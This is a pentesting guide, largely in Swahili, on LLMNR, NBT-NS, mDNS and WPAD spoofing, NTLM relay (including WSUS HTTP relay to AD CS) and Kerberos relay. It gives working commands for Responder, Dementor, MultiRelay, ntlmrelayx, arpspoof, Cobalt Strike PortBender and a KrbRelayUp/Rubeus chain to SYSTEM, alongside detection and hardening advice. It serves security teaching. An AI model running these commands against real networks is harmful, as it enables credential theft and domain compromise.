# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Network Protocols

### Local Host Resolution Protocols

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft na mifumo mingine ya uendeshaji zinatumia LLMNR na NBT-NS kwa utambuzi wa majina ya ndani wakati DNS inashindwa. Vilevile, mifumo ya Apple na Linux inatumia mDNS.
- Protokoli hizi zinaweza kupigwa kati na kufugwa kwa majibu kwa sababu hazina uthibitisho na zinatuma matangazo kupitia UDP.
- [Responder](https://github.com/lgandx/Responder) na [Dementor](https://github.com/MatrixEditor/Dementor) zinaweza kutumika kujifanya huduma kwa kutuma majibu bandia kwa mashine zinazouliza kupitia protokoli hizi.
- Taarifa zaidi kuhusu kujifanya huduma kwa kutumia Responder inapatikana [here](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD inaruhusu vivinjari kugundua mipangilio ya proxy kiotomatiki.
- Ugunduzi hufanywa kupitia DHCP, DNS, au kurudi kwa LLMNR na NBT-NS ikiwa DNS inashindwa.
- Responder inaweza kuendesha mashambulizi ya WPAD kiotomatiki, ikielekeza wateja kwenye seva za WPAD zenye madhara.

### Responder/Dementor for Protocol Poisoning

- **Responder** ni chombo kinachotumika kuchomeka (poison) maswali ya LLMNR, NBT-NS, na mDNS, kikiwajibia kwa kuchagua kulingana na aina za maswali, hasa lengo likiwa huduma za SMB.
- Kimewekwa awali katika Kali Linux, kinaweza kusanidiwa katika `/etc/responder/Responder.conf`.
- Responder inaonyesha hashes zilizoshikwa kwenye skrini na kuzihifadhi katika saraka ya `/usr/share/responder/logs`.
- Kinaunga mkono IPv4 na IPv6.
- Toleo la Windows la Responder linapatikana [here](https://github.com/lgandx/Responder-Windows).

- **Dementor** inaendeleza mada za multicast poisoning na pia inafanya kama mtoa huduma mwizi (rogue service provider) (ikiwemo msaada wa CUPS RCE)
- Muundo kwa ujumla ni sawa na **Responder** na usanidi wa kina zaidi. (default is here: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- Ulinganifu kati ya **Dementor** na **Responder** umeelezewa hapa: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Utangulizi na Nyaraka hapa: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Inarekebisha matatizo ya kukamata yaliyotokana na Responder kwenye protokoli fulani

#### Running Responder

- Kuendesha Responder kwa mipangilio ya default: `responder -I <Interface>`
- Kwa kuchunguza kwa nguvu zaidi (inaweza kusababisha athari): `responder -I <Interface> -P -r -v`
- Mbinu za kukamata changamoto/majibu ya NTLMv1 kwa urahisi wa kuvunjwa: `responder -I <Interface> --lm --disable-ess`
- Kujifanya WPAD kunaweza kuwashwa na: `responder -I <Interface> --wpad`
- Maombi ya NetBIOS yanaweza kutatuliwa kwenda IP ya mshambuliaji, na proxy ya uthibitisho inaweza kusanidiwa: `responder.py -I <interface> -Pv`

#### Running Dementor

- Kwa mipangilio ya chaguo-msingi iliyowezeshwa: `Dementor -I <interface>`
- Kwa mipangilio ya chaguo-msingi katika mode ya uchambuzi: `Dementor -I <interface> -A`
- Kupunguza kiotomatiki vikao vya NTLM (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Endesha kikao cha sasa kwa config ya desturi: `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning with Responder

- Kughushi majibu ya DHCP kunaweza kuchomeka kwa milele taarifa za routing za adui, ikitoa mbadala wa siri zaidi kuliko ARP poisoning.
- Inahitaji uelewa sahihi wa usanidi wa mtandao wa lengo.
- Kuendesha shambulio: `./Responder.py -I eth0 -Pdv`
- Njia hii inaweza kukamata kwa ufanisi hashes za NTLMv1/2, lakini inahitaji utunzaji makini ili kuepuka kuharibu mtandao.

### Capturing Credentials with Responder/Dementor

- Responder/Dementor itajiita huduma kwa kutumia protokoli zilizotajwa hapo juu, ikikamata nywila/uthibitisho (kwa kawaida NTLMv2 Challenge/Response) wakati mtumiaji anapo jaribu kuingia kwenye huduma zilizojiita.
- Jaribio zinaweza kufanywa kupunguza hadi NetNTLMv1 au kuzima ESS kwa ajili ya kuvunjwa kwa nywila kwa urahisi.

If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

Ni muhimu kutambua kwamba kutumia mbinu hizi inapaswa kufanywa kisheria na kwa maadili, ukiweka idhini sahihi na kuepuka kusababisha uharibifu au kupata ufikiaji bila idhini.

## Inveigh

Inveigh ni chombo kwa watendaji wa pentesting na red teamers, kilichoundwa kwa mifumo ya Windows. Kinatoa kazi zinazofanana na Responder, kikifanya spoofing na man-in-the-middle attacks. Chombo kimeendelea kutoka script ya PowerShell hadi binary ya C#, na [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) na [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) ni matoleo makuu. Vigezo na maelekezo ya kina vinapatikana kwenye [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh inaweza kuendeshwa kupitia PowerShell:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Au ikitekelezwa kama C# binary:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Shambulio hili linatumia vikao vya uthibitisho vya SMB kupata ufikiaji kwenye mashine lengwa, na kutoa shell ya mfumo ikiwa litafanikiwa. Masharti muhimu ni pamoja na:

- Mtumiaji anayethibitisha lazima awe na Local Admin access kwenye relayed host.
- SMB signing inapaswa kuzimwa.

#### 445 Port Forwarding and Tunneling

Katika matukio ambapo kuingilia mtandao moja kwa moja haiwezekani, trafiki kwenye port 445 inahitaji kupitishwa na kupelekwa kupitia tunnel. Vifaa kama [**PortBender**](https://github.com/praetorian-inc/PortBender) husaidia kuelekeza tena trafiki ya port 445 kwenda port nyingine, jambo muhimu pale ambapo Local Admin access inapatikana kwa ajili ya driver loading.

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Other Tools for NTLM Relay Attack

- **Metasploit**: Sanidi kwa kutumia proxies, pamoja na maelezo ya host za ndani na za mbali.
- **smbrelayx**: Script ya Python kwa ajili ya relaying session za SMB na executing commands au deploying backdoors.
- **MultiRelay**: Zana kutoka kwa Responder suite ya kurelay users maalum au users wote, execute commands, au dump hashes.

Kila zana inaweza kusanidiwa kufanya kazi kupitia SOCKS proxy inapohitajika, ikiruhusu attacks hata kwa upatikanaji wa network kwa njia isiyo ya moja kwa moja.

### MultiRelay Operation

MultiRelay inaendeshwa kutoka kwenye _**/usr/share/responder/tools**_ directory, ikilenga specific IPs au users.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Vifaa na mbinu hizi zinaunda seti kamili ya kutekeleza NTLM Relay attacks katika mazingira mbalimbali ya mtandao.

### Kutumia vibaya WSUS HTTP (8530) for NTLM Relay to LDAP/SMB/AD CS (ESC8)

WSUS clients huthibitisha kwenye update server yao kwa kutumia NTLM juu ya HTTP (8530) au HTTPS (8531). Wakati HTTP imewezeshwa, check-ins za client za mara kwa mara zinaweza kulazimishwa au kuingiliwa kwenye segment ya ndani na kuliruriwa na ntlmrelayx kwenda LDAP/LDAPS/SMB au AD CS HTTP endpoints (ESC8) bila cracking ya hashes. Hii inaingiliana na trafiki ya kawaida ya updates na mara nyingi hupatikana uthibitisho wa akaunti za mashine (HOST$).

Vitu vya kutafuta
- Usanidi wa GPO/registry chini ya HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate na ...\WindowsUpdate\AU:
- WUServer (e.g., http://wsus.domain.local:8530)
- WUStatusServer (reporting URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled and DetectionFrequency (saa)
- WSUS SOAP endpoints zinazotumiwa na clients kwa HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Bandari za default: 8530/tcp HTTP, 8531/tcp HTTPS

Uchunguzi
- Pasina uthibitisho
- Skani kwa listeners: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Sniff trafiki ya HTTP WSUS kupitia L2 MITM na rekodi clients/endpoints zenye shughuli kwa kutumia wsusniff.py (HTTP tu isipokuwa ukaweza kufanya clients waaminie TLS cert yako).
- Kwa uthibitisho
- Changanua SYSVOL GPOs kwa funguo za WSUS kwa kutumia MANSPIDER + regpol (wrappa wa wsuspider.sh hujumlisha WUServer/WUStatusServer/UseWUServer).
- Uliza endpoints kwa wingi kutoka hosts (NetExec) au kwa ndani:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

Hatua za end-to-end za HTTP relay
1) Jipange kwa MITM (L2 ileile) ili client iresolve server ya WSUS kwa wewe (ARP/DNS poisoning, Bettercap, mitm6, n.k.). Mfano na arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Rejea port 8530 kwa relay listener yako (hiari, rahisi):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Anza ntlmrelayx na HTTP listener (inahitaji Impacket support kwa HTTP listener; ona PRs hapa chini):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Malengo mengine yanayotokea mara kwa mara:
- Relay kwenda SMB (ikiwa signing imezimwa) kwa exec/dump: -t smb://<host>
- Relay kwenda LDAPS kwa mabadiliko ya directory (mfano, RBCD): -t ldaps://<DC>
- Relay kwenda AD CS web enrollment (ESC8) ili kutengeneza cert kisha kujitambulisha kupitia Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
Kwa njia za kina za AD CS misuse na tooling, ona ukurasa wa AD CS:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Sababisha client kufanya check-in au subiri ratiba. Kutoka kwa client:
wuauclt.exe /detectnow
au tumia Windows Update UI (Check for updates).

5) Tumia sessions za SOCKS zilizothibitishwa (ikiwa -socks) au matokeo ya relay ya moja kwa moja kwa post-exploitation (mabadiliko ya LDAP, shughuli za SMB, au utoaji wa certificate ya AD CS kwa uthibitisho baadaye).

Kizuizi cha HTTPS (8531)
- Passive interception ya WSUS juu ya HTTPS haifanyi kazi isipokuwa clients waanze kuamini certificate yako. Bila cert iliyoaminika au njia ya kuvunja TLS, NTLM handshake haiwezi kukamatwa/kurudishwa kutoka kwa trafiki ya WSUS HTTPS.

Vidokezo
- WSUS ilitangazwa kuwa deprecated lakini bado imetumika kwa wingi; HTTP (8530) bado ni ya kawaida katika mazingira mengi.
- Msaada muhimu: wsusniff.py (angalia HTTP WSUS check-ins), wsuspider.sh (orodhesha WUServer/WUStatusServer kutoka GPOs), NetExec reg-query kwa kiwango.
- Impacket ilirejesha support ya HTTP listener kwa ntlmrelayx katika PR #2034 (iliongezwa awali katika PR #913).

### Force NTLM Logins

Kwenye Windows unaweza **kuwa na uwezo wa kulazimisha baadhi ya akaunti zenye ruhusa za juu zithibitishwe kwa mashine yoyote**. Soma ukurasa ufuatao kujifunza jinsi:

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

A **Kerberos relay attack** inapora **AP-REQ ticket** kutoka kwa service moja na kuitumia tena dhidi ya service ya pili inayoshirikisha **same computer-account key** (kwa sababu SPNs zote zipo kwenye akaunti ya mashine yenye `$`). Hii inafanya kazi ingawa SPNs’ **service classes differ** (e.g. `CIFS/` → `LDAP/`) kwa sababu *key* inayofungua tiketi ni NT hash ya mashine, si mnyororo wa SPN mwenyewe na mnyororo wa SPN sio sehemu ya saini.

Tofauti na NTLM relay, hop imezuiliwa kwa *same host* lakini, ikiwa unalenga protocol inayokuruhusu kuandika kwa LDAP, unaweza kuunganisha kuwa **Resource-Based Constrained Delegation (RBCD)** au **AD CS enrollment** na kupata **NT AUTHORITY\SYSTEM** kwa jaribio moja.

Kwa maelezo ya kina kuhusu shambulio hili angalia:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Kerberos basics**

| Token | Madhumuni | Uhusiano na relay |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Inamthibitisha mtumiaji kwa KDC | untouched |
| **Service ticket / TGS-REQ ↔ REP** | Imefungwa kwa SPN moja; imefichwa kwa key ya mmiliki wa SPN | interchangeable if SPNs share account |
| **AP-REQ** | Mteja anatuma `TGS` kwa service | **what we steal & replay** |

* Tiketi zimefichwa kwa **password-derived key ya akaunti inayomiliki SPN**.
* **Authenticator** ndani ya AP-REQ ina timestamp ya dakika 5; kurudisha ndani ya dirisha hilo ni halali hadi cache ya service ionekane duplicate.
* Windows nadra hukagua kama mnyororo wa SPN katika tiketi unalingana na service uliyoigonga, hivyo tiketi ya `CIFS/HOST` kwa kawaida hufunguka vizuri kwenye `LDAP/HOST`.

- 2. **What must be true to relay Kerberos**

1. **Shared key:** source na target SPNs zinamilikiwa na akaunti ya kompyuta ileile (default kwenye Windows servers).
2. **No channel protection:** SMB/LDAP signing off na EPA off kwa HTTP/LDAPS.
3. **You can intercept or coerce authentication:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, n.k..
4. **Ticket source not already used:** unashinda mbio kabla packet halisi inafika au uizuie kabisa; vinginevyo replay cache ya server itatoa Event 4649.
5. Unahitaji kwa namna fulani kuwa na uwezo wa kufanya **MitM in the communication**, labda kwa kuwa sehemu ya group ya DNSAmins ili kubadilisha DNS ya domain au kuwa na uwezo wa kubadilisha HOST file ya mwathiriwa.

### Kerberos Relay Hatua

- 3.1 **Recon the host**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Anzisha msikilizaji wa relay**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` inaweka **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** katika binary moja.

- 3.3 **Lazimisha Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce inafanya DC kututumia kwetu tiketi ya Kerberos `CIFS/DC01`.

- 3.4 **Relay the AP-REQ**

KrbRelay hutoa GSS blob kutoka SMB, huipakia upya kama LDAP bind, na kuipeleka kwa `ldap://DC01` — uthibitisho unafanikiwa kwa sababu **funguo ile ile** inaidecrypt.

- 3.5 **Abuse LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Sasa unamiliki **NT AUTHORITY\SYSTEM**.


### **Njia zaidi zinazostahili kujulikana**

| Vector | Njia | Kwa nini ni muhimu |
|--------|------|--------------------|
| **AuthIP / IPSec** | Server bandia inatuma **GSS-ID payload** kwa SPN yoyote; client hujenga AP-REQ moja kwa moja kwako | Inafanya kazi hata kupitia subnets; inatumia machine creds kwa default |
| **DCOM / MSRPC** | Malicious OXID resolver inalazimisha client ku-auth kwa SPN yoyote na port | Pure *local* priv-esc; inaepuka firewall |
| **AD CS Web Enroll** | Relay tiketi ya machine kwenye `HTTP/CA` na upate cert, kisha **PKINIT** kutengeneza TGTs | Inavuka defenses za LDAP signing |
| **Shadow Credentials** | Andika `msDS-KeyCredentialLink`, kisha PKINIT kwa forged key pair | Hakuna haja ya kuongeza computer account |

### **Utatuzi wa matatizo**

| Hitilafu | Maana | Suluhisho |
|----------|-------|----------|
| `KRB_AP_ERR_MODIFIED` | Ticket key ≠ target key | Host/SPN si sahihi |
| `KRB_AP_ERR_SKEW` | Clock > 5 min offset | Synchronized time au tumia `w32tm` |
| LDAP bind fails | Signing enforced | Tumia AD CS path au zima signing |
| Event 4649 spam | Service iliona Authenticator rudufu | Block au race packet ya asili |


### **Utambuzi**

* Mafuriko ya **Event 4769** kwa `CIFS/`, `HTTP/`, `LDAP/` kutoka chanzo kimoja ndani ya sekunde chache.
* **Event 4649** kwenye huduma inaonyesha replay imegunduliwa.
* Kerberos logon kutoka **127.0.0.1** (relay to local SCM) ni ya wasiwasi mkubwa—fanya ramani kupitia Sigma rule katika KrbRelayUp docs.
* Angalia mabadiliko ya `msDS-AllowedToActOnBehalfOfOtherIdentity` au `msDS-KeyCredentialLink` attributes.

## **Kuimarisha**

1. **Lazimisha LDAP & SMB signing + EPA** kwenye kila server.
2. **Gawanya SPNs** ili HTTP isifungwe kwenye akaunti ile ile kama CIFS/LDAP.
3. Patch coercion vectors (PetitPotam KB5005413, DFS, AuthIP).
4. Weka **`ms-DS-MachineAccountQuota = 0`** ili kuzuia kujiunga kwa kompyuta za mhemko.
5. Weka onyo kwa **Event 4649** na logons za Kerberos za loopback zisizotarajiwa.



## References

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)

{{#include ../../banners/hacktricks-training.md}}
